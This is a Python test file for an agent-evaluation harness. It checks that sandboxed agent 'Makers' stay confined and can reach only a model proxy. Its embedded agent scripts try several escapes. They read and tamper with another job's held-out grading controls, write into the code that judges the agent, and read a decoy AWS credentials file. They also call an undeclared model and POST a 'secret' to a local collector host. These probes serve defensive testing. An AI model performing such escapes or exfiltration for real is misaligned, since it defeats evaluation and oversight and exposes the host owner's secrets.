"""Sandbox confinement, network confinement and proxy-transport invariants — findings raised in the 2026-11-17/18 briefings, re-homed by concern (not by review date).

Sandbox tests run under whatever maker.sandbox the host supports (sandbox-exec on macOS,
bwrap on Linux) and skip when neither can launch. Platform notes per test:
  A1, A2  red on Linux (bwrap) only; the macOS profile already denies writes.
  B, E    red on both platforms.
  D*      platform-independent.
Every test cleans up anything it manages to write outside its own temp tree.
"""
import http.server
import json
import os
import pathlib
import shutil
import sys
import tempfile
import threading
import unittest
import uuid

import test_edi
import gates
import loop
import adapters

from support_briefing import PASSING, _Base, _R2Base, _serve

REPO = pathlib.Path(loop.__file__).resolve().parent


class _RecordingUpstream(http.server.BaseHTTPRequestHandler):
    seen = []

    def log_message(self, format, *args):  # noqa: A002
        return

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers.get("Content-Length", "0"))) or b"{}")
        type(self).seen.append(body.get("model"))
        raw = json.dumps({"model": body.get("model"), "usage": {"total_tokens": 10},
                          "choices": [{"message": {"content": "ok"}}]}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)


# ---------------------------------------------------------------- Finding 4
class Finding4AgentMaker(_Base):
    def test_4a_proxy_forwards_only_the_declared_model(self):
        """The record names the declared model; the proxy must not let the agent call another."""
        _RecordingUpstream.seen = []
        srv = http.server.HTTPServer(("127.0.0.1", 0), _RecordingUpstream)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        try:
            job = self._agent_job("f4a", (
                "import json, os, pathlib, sys, urllib.request\n"
                "for model in ('other-family/model-x', os.environ['AGENT_MODEL']):\n"
                "    body = json.dumps({'model': model, 'messages': [{'role': 'user', 'content': 'draft'}]}).encode()\n"
                "    try:\n"
                "        urllib.request.urlopen(urllib.request.Request(os.environ['AGENT_PROXY_URL'], data=body, method='POST'), timeout=10).read()\n"
                "    except Exception:\n"
                "        pass\n"
                "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "', encoding='utf-8')\n"),
                url=f"http://127.0.0.1:{srv.server_port}/v1/chat/completions")
            cfg = self._cfg(job)
            st = test_edi._SANDBOX_TYPE
            if st is None:
                self.skipTest("no OS sandbox available on this host")
            cfg["maker"]["sandbox"] = {"type": st}
            self._save(job, cfg)
            loop.freeze_job(job)
            loop.run_job(job)
            self.assertNotIn("other-family/model-x", _RecordingUpstream.seen,
                             f"proxy forwarded an undeclared model upstream: {_RecordingUpstream.seen}")
        finally:
            srv.shutdown()
            srv.server_close()

    def _cl2_agent_job(self, subdir, eval_family, eval_endpoint):
        job = self._agent_job(subdir, "import sys\n", level="CL2")
        cfg = self._cfg(job)
        cfg["evaluators"].append({"id": "E2", "name": "Model Judge", "kind": "model", "script": None, "runs": 2,
                                  "url": f"https://{eval_endpoint}/v1/chat/completions",
                                  "model": {"family": eval_family, "identifier": "judge-1", "endpoint": eval_endpoint, "readOnly": True}})
        self._save(job, cfg)
        return job

    def test_4b_cl2_family_gate_applies_to_agent_makers(self):
        """CL2-3: gate_seats checks family/endpoint independence only for kind == model, so an
        agent Maker skips it at freeze and the job fails only at finalize, after the spend."""
        job = self._cl2_agent_job("f4b", eval_family="mock", eval_endpoint="127.0.0.1")
        with self.assertRaises(gates.GateError):
            loop.freeze_job(job)

    def test_r3a_freeze_refuses_unconfined_agent_maker_above_cl1(self):
        """Ruling R3, option A (interim): no agent Maker at CL2/CL3 until OS-level confinement exists."""
        job = self._cl2_agent_job("f4r3", eval_family="other", eval_endpoint="other.example")
        with self.assertRaises(gates.GateError):
            loop.freeze_job(job)

    def test_4d_agent_maker_cannot_read_held_out(self):
        """D3.held-out: held-out material never reaches the Maker. R3 (sandboxed variant):
        the runtime launches agent Makers under maker.sandbox confinement, so held_out/
        is neither readable nor writable, and the custody log stays out of reach."""
        import test_edi as _te
        if _te._SANDBOX_TYPE is None:
            self.skipTest("no OS sandbox available on this host")
        job = self._agent_job("f4d", (
            "import pathlib, sys\n"
            "ho = pathlib.Path(__file__).resolve().parents[1] / 'held_out' / 'controls' / 'planted.md'\n"
            "try:\n"
            "    ho.read_text(); seen = True\n"
            "except OSError:\n"
            "    seen = False\n"
            "try:\n"
            "    pathlib.Path(ho.parent, 'tampered.md').write_text('x'); wrote = True\n"
            "except OSError:\n"
            "    wrote = False\n"
            "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "held_out_readable=' + str(seen) + ' held_out_writable=' + str(wrote) + '\\n', encoding='utf-8')\n"))
        cfg = self._cfg(job)
        cfg["maker"]["sandbox"] = {"type": test_edi._SANDBOX_TYPE}
        self._save(job, cfg)
        loop.freeze_job(job)
        loop.run_job(job)
        memo = (job / "rounds" / "round-01" / "artifact" / "memo.md").read_text()
        self.assertIn("held_out_readable=False", memo)
        self.assertIn("held_out_writable=False", memo)  # deny file-write* keeps the controls intact


class FindingG_LinuxCredentialParity(_R2Base):
    def test_g_bwrap_masks_the_credential_dotfile_family(self):
        """Round-2 close-out #1: the bwrap masks must cover the same home
        credential-dotfile family as the macOS seatbelt profile (argv-level:
        no launch needed, so this runs anywhere bwrap exists)."""
        import shutil, unittest.mock
        if shutil.which("bwrap") is None:
            self.skipTest("bwrap not available on this host")
        fake_home = self.tmp  # NOT .name -- the fixture bug that turned the Linux legs red
        (fake_home / ".ssh").mkdir()
        jd = fake_home / "jobs" / "jobA"
        (jd / "held_out").mkdir(parents=True)
        sb = fake_home / "sb"
        sb.mkdir()
        # decoys for EVERY entry, so a dropped tuple member cannot hide behind
        # 'mask applies only to existing paths'
        for n in adapters._HOME_DOTFILE_DIRS:
            (fake_home / ("." + n)).mkdir(exist_ok=True)
        for n in adapters._HOME_DOTFILE_FILES:
            f = fake_home / ("." + n)
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text("decoy")
        with unittest.mock.patch("adapters.pathlib.Path.home", return_value=fake_home):
            cmd = adapters.sandbox_prefix("bwrap", jd, sb)
        pairs = [(cmd[i], cmd[i + 1]) for i in range(len(cmd) - 1)]  # contiguous flag/path pairs
        for n in adapters._HOME_DOTFILE_DIRS:
            self.assertIn(("--tmpfs", str(fake_home / ("." + n))), pairs)
        for n in adapters._HOME_DOTFILE_FILES:
            self.assertIn(("--ro-bind", "/dev/null", str(fake_home / ("." + n))),
                          [(cmd[i], cmd[i + 1], cmd[i + 2]) for i in range(len(cmd) - 2)])


class FindingH_UnresolvedHome(_R2Base):
    def test_h_profile_built_from_unresolved_home_still_denies(self):
        """Round-2 close-out (adversarial #1): tempfile paths on macOS live under a
        symlinked /var/folders; a profile built from the UNRESOLVED path silently
        voids every dotfile deny. sandbox_prefix/run_maker must .resolve() home."""
        if test_edi._SANDBOX_TYPE != "sandbox-exec":
            self.skipTest("needs sandbox-exec")
        fake_home = self.tmp  # /var/folders/... -- NON-canonical on macOS
        (fake_home / ".aws").mkdir()
        cred = fake_home / ".aws" / "credentials"
        cred.write_text("SECRET-AWS")
        target = str(cred)  # attacker uses the path as found, unresolved
        script = (
            "import pathlib, sys\n"
            "try:\n"
            "    open(" + repr(target) + ").read()\n"
            "    verdict = 'LEAKED'\n"
            "except PermissionError:\n"
            "    verdict = 'DENIED'\n"
            "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "aws=' + verdict + '\\n', encoding='utf-8')\n")
        import unittest.mock
        job = self._sandboxed_agent_job("home-resolve", script)
        with unittest.mock.patch("adapters.pathlib.Path.home", return_value=fake_home):
            loop.freeze_job(job)
            loop.run_job(job)
        self.assertIn("aws=DENIED", self._memo_tail(job))


class FindingF_AgentTmpdir(_R2Base):
    def test_f_the_sandboxed_agent_has_a_usable_temp_root(self):
        """Deep-review P1: writes are workspace-confined, so tempfile must resolve
        inside the workspace -- an agent that touches tempfile must not die."""
        job = self._sandboxed_agent_job("tmpdir", (
            "import pathlib, sys, tempfile\n"
            "d = tempfile.mkdtemp()\n"
            "pathlib.Path(d, 'w.txt').write_text('ok')\n"
            "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "tmp=ok\\n', encoding='utf-8')\n"))
        loop.freeze_job(job)
        loop.run_job(job)
        self.assertIn("tmp=ok", self._memo_tail(job))


# ------------------------------------------------------------------ Finding A
class FindingA_SandboxWrites(_R2Base):
    def test_a1_sandboxed_agent_cannot_write_outside_its_workspace(self):
        """The Maker must not be able to change the code that judges it, or anything else on the host."""
        tag = uuid.uuid4().hex[:8]
        outside = pathlib.Path(tempfile.mkdtemp(prefix="edi_r2_outside_"))
        targets = {"edi-run code dir": REPO / f"edi_r2_probe_{tag}.txt",
                   "dir outside the workspace": outside / f"edi_r2_probe_{tag}.txt",
                   "home dir": pathlib.Path.home() / f".edi_r2_probe_{tag}"}
        try:
            lines = "".join(f"try:\n    pathlib.Path({str(p)!r}).write_text('x')\nexcept OSError:\n    pass\n" for p in targets.values())
            job = self._sandboxed_agent_job("a1", "import pathlib, sys\n" + lines +
                                            "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "', encoding='utf-8')\n")
            loop.freeze_job(job)
            loop.run_job(job)
            written = [name for name, p in targets.items() if p.exists()]
            self.assertEqual(written, [], f"sandboxed agent wrote to the host: {written}")
        finally:
            for p in targets.values():
                p.unlink(missing_ok=True)
            shutil.rmtree(outside, ignore_errors=True)

    def test_a2_freeze_and_run_create_nothing_in_home(self):
        """Neither the freeze-time sandbox probe nor the launch may create files in the Owner's home."""
        fake_home = pathlib.Path(tempfile.mkdtemp(prefix="edi_r2_home_"))
        old = os.environ.get("HOME")
        os.environ["HOME"] = str(fake_home)
        try:
            job = self._sandboxed_agent_job("a2", "import pathlib, sys\npathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "', encoding='utf-8')\n")
            loop.freeze_job(job)
            loop.run_job(job)
            created = sorted(str(p.relative_to(fake_home)) for p in fake_home.rglob("*"))
            self.assertEqual(created, [], f"sandbox created files in $HOME: {created}")
        finally:
            if old is None:
                os.environ.pop("HOME", None)
            else:
                os.environ["HOME"] = old
            shutil.rmtree(fake_home, ignore_errors=True)


# ------------------------------------------------------------------ Finding B
class FindingB_NeighbourHeldOut(_R2Base):
    def test_b_sandboxed_agent_cannot_read_a_neighbouring_jobs_held_out(self):
        """D3.held-out: held-out material never reaches the Maker, including another job's controls
        under the same jobs root (a reused control set is the normal case)."""
        self._make_base_job(subdir="job_A")  # an earlier job beside this one
        job = self._sandboxed_agent_job("job_B", (
            "import pathlib, sys\n"
            "root = pathlib.Path(__file__).resolve().parents[2]\n"
            "seen = []\n"
            "for p in root.glob('*/held_out/controls/*.md'):\n"
            "    try:\n"
            "        p.read_text(); seen.append(p.parents[2].name)\n"
            "    except OSError:\n"
            "        pass\n"
            "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "seen=' + ','.join(sorted(set(seen))) + '\\n', encoding='utf-8')\n"))
        loop.freeze_job(job)
        loop.run_job(job)
        self.assertEqual(self._memo_tail(job), "seen=", "agent read held-out controls of: " + self._memo_tail(job))


# ------------------------------------------------------------------ Finding D
class _Status500(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002
        return

    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length", "0")))
        self.send_response(500)
        self.end_headers()
        self.wfile.write(b'{"error": "upstream exploded"}')


_AGENT_CALLS_ONCE = (
    "import json, os, pathlib, sys, urllib.request, urllib.error\n"
    "body = json.dumps({'model': os.environ['AGENT_MODEL'], 'messages': [{'role': 'user', 'content': 'x'}]}).encode()\n"
    "try:\n"
    "    r = urllib.request.urlopen(urllib.request.Request(os.environ['AGENT_PROXY_URL'], data=body, method='POST'), timeout=10)\n"
    "    got = 'HTTP %s' % r.status\n"
    "except urllib.error.HTTPError as e:\n"
    "    got = 'HTTP %s' % e.code\n"
    "except Exception as e:\n"
    "    got = 'DROPPED ' + type(e).__name__\n"
    "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "agent_saw=' + got + '\\n', encoding='utf-8')\n")


class FindingD_ProxyErrors(_R2Base):
    def _proxy_lines(self, job):
        return [json.loads(ln) for p in job.rglob("proxy-usage.jsonl") for ln in p.read_text().splitlines() if ln.strip()]

    def test_d1_an_upstream_error_reaches_the_agent_and_is_logged_once(self):
        srv = _serve(_Status500)
        try:
            job = self._sandboxed_agent_job("d1", _AGENT_CALLS_ONCE, url=f"http://127.0.0.1:{srv.server_port}/v1/chat/completions")
            loop.freeze_job(job)
            loop.run_job(job)
            self.assertEqual(self._memo_tail(job), "agent_saw=HTTP 500", "the agent did not get the upstream status")
            self.assertEqual(len(self._proxy_lines(job)), 1, f"one call, logged as: {self._proxy_lines(job)}")
        finally:
            srv.shutdown()
            srv.server_close()

    def test_d2_an_unreachable_upstream_reaches_the_agent_as_an_error(self):
        closed = _serve(_Status500)
        port = closed.server_port
        closed.shutdown()
        closed.server_close()  # nothing listens on this port now
        job = self._sandboxed_agent_job("d2", _AGENT_CALLS_ONCE, url=f"http://127.0.0.1:{port}/v1/chat/completions")
        loop.freeze_job(job)
        loop.run_job(job)
        self.assertTrue(self._memo_tail(job).startswith("agent_saw=HTTP 5"), self._memo_tail(job))


# ------------------------------------------------------------------ Finding E
class _Collector(http.server.BaseHTTPRequestHandler):
    hits = []

    def log_message(self, format, *args):  # noqa: A002
        return

    def do_POST(self):
        type(self).hits.append(self.rfile.read(int(self.headers.get("Content-Length", "0"))))
        self.send_response(200)
        self.end_headers()


class FindingE_Network(_R2Base):
    def test_e_sandboxed_agent_reaches_only_the_proxy(self):
        """The agent needs the proxy and nothing else; any other host is an exfiltration channel
        for whatever else the agent can read."""
        _Collector.hits = []
        collector, upstream = _serve(_Collector), _serve(_RecordingUpstream)
        try:
            job = self._sandboxed_agent_job("e", (
                "import json, os, pathlib, sys, urllib.request\n"
                "def post(url, payload):\n"
                "    try:\n"
                "        return urllib.request.urlopen(urllib.request.Request(url, data=json.dumps(payload).encode(), method='POST'), timeout=5).status\n"
                "    except Exception as e:\n"
                "        return type(e).__name__\n"
                "leak = post('http://127.0.0.1:{collector_port}/collect', {'secret': 'from-agent'})\n"
                "proxy = post(os.environ['AGENT_PROXY_URL'], {'model': os.environ['AGENT_MODEL'], 'messages': [{'role': 'user', 'content': 'x'}]})\n"
                "pathlib.Path(sys.argv[2], 'memo.md').write_text('" + PASSING + "proxy=' + str(proxy) + '\\n', encoding='utf-8')\n"
            ).replace("{collector_port}", str(collector.server_port)),
                url=f"http://127.0.0.1:{upstream.server_port}/v1/chat/completions")
            loop.freeze_job(job)
            loop.run_job(job)
            self.assertEqual(_Collector.hits, [], "sandboxed agent reached a host other than the proxy")
            self.assertEqual(self._memo_tail(job), "proxy=200", "the proxy itself must stay reachable")
        finally:
            for s in (collector, upstream):
                s.shutdown()
                s.server_close()


# ------------------------------------------------------------------ Finding J
class FindingJ_HttpUpstream(_R2Base):
    def test_j_agent_proxy_refuses_plain_http_upstream(self):
        """Recheck H1: the proxy holds the key; a configured http:// upstream
        (loopback-range 127.0.0.2 is NOT exempt) must be refused, not served."""
        import adapters
        for url in ("http://127.0.0.2/v1", "http://example.invalid/v1"):
            with self.assertRaises(ValueError):
                adapters._require_https(url)
        adapters._require_https("https://example.invalid/v1")  # control: accepted
        adapters._require_https("http://127.0.0.1/v1")  # loopback exempt


if __name__ == "__main__":
    unittest.main()
